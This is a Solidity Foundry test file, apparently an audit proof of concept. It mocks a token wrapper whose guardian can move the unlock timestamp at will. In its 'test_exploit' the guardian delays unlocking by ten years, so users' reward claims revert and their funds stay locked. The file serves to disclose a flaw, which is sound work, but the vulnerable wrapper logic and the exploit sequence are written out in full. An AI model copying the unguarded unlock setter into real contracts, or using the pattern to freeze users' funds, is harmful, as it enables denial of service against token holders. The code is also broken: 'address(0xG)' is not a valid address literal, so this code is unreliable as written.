// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////////////////
                              MOCK INTERFACES
//////////////////////////////////////////////////////////////////////////*/

library Errors {
    error NotAllowed();
    error NotGovernorOrGuardian();
}

interface IAccessControlManager {
    function isGovernor(address) external view returns (bool);
    function isGovernorOrGuardian(address) external view returns (bool);
}

contract MockAccessControlManager is IAccessControlManager {
    mapping(address => bool) public governors;
    mapping(address => bool) public guardians;

    function setGovernor(address a, bool v) external { governors[a] = v; }
    function setGuardian(address a, bool v) external { guardians[a] = v; }

    function isGovernor(address a) external view returns (bool) { return governors[a]; }
    function isGovernorOrGuardian(address a) external view returns (bool) {
        return governors[a] || guardians[a];
    }
}

/// @notice Minimal ERC20
contract MockERC20 {
    string public name = "Underlying";
    string public symbol = "UND";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Simplified TokenTGEWrapper containing the same vulnerable logic
contract TokenTGEWrapperMock {
    address public underlying;
    address public distributor;
    address public feeRecipient;
    uint256 public unlockTimestamp;
    IAccessControlManager public accessControlManager;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(
        address _underlying,
        address _distributor,
        address _feeRecipient,
        uint256 _unlockTimestamp,
        address _acm
    ) {
        underlying = _underlying;
        distributor = _distributor;
        feeRecipient = _feeRecipient;
        unlockTimestamp = _unlockTimestamp;
        accessControlManager = IAccessControlManager(_acm);
    }

    function token() public view returns (address) { return underlying; }

    modifier onlyGuardian() {
        if (!accessControlManager.isGovernorOrGuardian(msg.sender)) revert Errors.NotGovernorOrGuardian();
        _;
    }

    function setUnlockTimestamp(uint256 _newUnlockTimestamp) external onlyGuardian {
        unlockTimestamp = _newUnlockTimestamp;
    }

    /// @notice Mint wrapped tokens to the distributor (simulates Merkl funding)
    function mintToDistributor(uint256 amount) external {
        // pull underlying from caller, mint wrapped to distributor
        MockERC20(underlying).transferFrom(msg.sender, address(this), amount);
        balanceOf[distributor] += amount;
        totalSupply += amount;
    }

    /// @notice The transfer function used during a Merkl claim (distributor -> user)
    /// Reproduces _afterTokenTransfer logic
    function transfer(address to, uint256 amount) external returns (bool) {
        address from = msg.sender;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        // _afterTokenTransfer
        if (from == distributor) {
            if (block.timestamp < unlockTimestamp) revert Errors.NotAllowed();
            // burn `to` and pay underlying
            balanceOf[to] -= amount;
            totalSupply -= amount;
            MockERC20(underlying).transfer(to, amount);
        }
        return true;
    }
}

/// @notice Minimal Distributor that performs claim by transferring wrapper tokens
contract MockDistributor {
    function claim(address wrapper, address user, uint256 amount) external {
        // transfers from distributor (this contract) to user, triggering _afterTokenTransfer
        TokenTGEWrapperMock(wrapper).transfer(user, amount);
    }
}

/*//////////////////////////////////////////////////////////////////////////
                                  EXPLOIT
//////////////////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    MockERC20 underlying;
    MockAccessControlManager acm;
    TokenTGEWrapperMock wrapper;
    MockDistributor distributor;

    address guardian = address(0xG);
    address governor = address(0xA);
    address user = address(0xBEEF);
    address feeRecipient = address(0xFEE);

    uint256 initialUnlock;

    function setUp() public {
        vm.warp(1_000_000);

        underlying = new MockERC20();
        acm = new MockAccessControlManager();
        acm.setGovernor(governor, true);
        acm.setGuardian(guardian, true);

        distributor = new MockDistributor();

        // Original unlock: 30 days from now
        initialUnlock = block.timestamp + 30 days;

        wrapper = new TokenTGEWrapperMock(
            address(underlying),
            address(distributor),
            feeRecipient,
            initialUnlock,
            address(acm)
        );

        // Fund the wrapper with underlying so it can pay out claims
        underlying.mint(address(this), 1_000 ether);
        underlying.approve(address(wrapper), type(uint256).max);
        // Mint 1000 wrapped tokens to the distributor (simulating accrued rewards)
        wrapper.mintToDistributor(1_000 ether);
    }

    function test_exploit() public {
        // Step 1: time passes, we are just before original unlock
        vm.warp(initialUnlock - 1);

        // Sanity: claim would succeed once unlock hits naturally.
        // Step 2: guardian maliciously raises unlockTimestamp to 10 years out
        vm.prank(guardian);
        wrapper.setUnlockTimestamp(block.timestamp + 365 days * 10);

        // Step 3: warp to original unlock — users expect to claim now
        vm.warp(initialUnlock + 1);

        // Step 4: user attempts to claim via distributor — DoS, reverts with NotAllowed
        vm.expectRevert(Errors.NotAllowed.selector);
        distributor.claim(address(wrapper), user, 100 ether);

        // Step 5: even far in the "old" future, claims still revert because the new unlock is years away
        vm.warp(initialUnlock + 365 days);
        vm.expectRevert(Errors.NotAllowed.selector);
        distributor.claim(address(wrapper), user, 100 ether);

        // Assertion: user balance of underlying is still zero — funds locked
        assertEq(underlying.balanceOf(user), 0, "user funds locked by guardian");
        // Distributor still holds the wrapped tokens (DoS confirmed)
        assertEq(wrapper.balanceOf(address(distributor)), 1_000 ether);
    }
}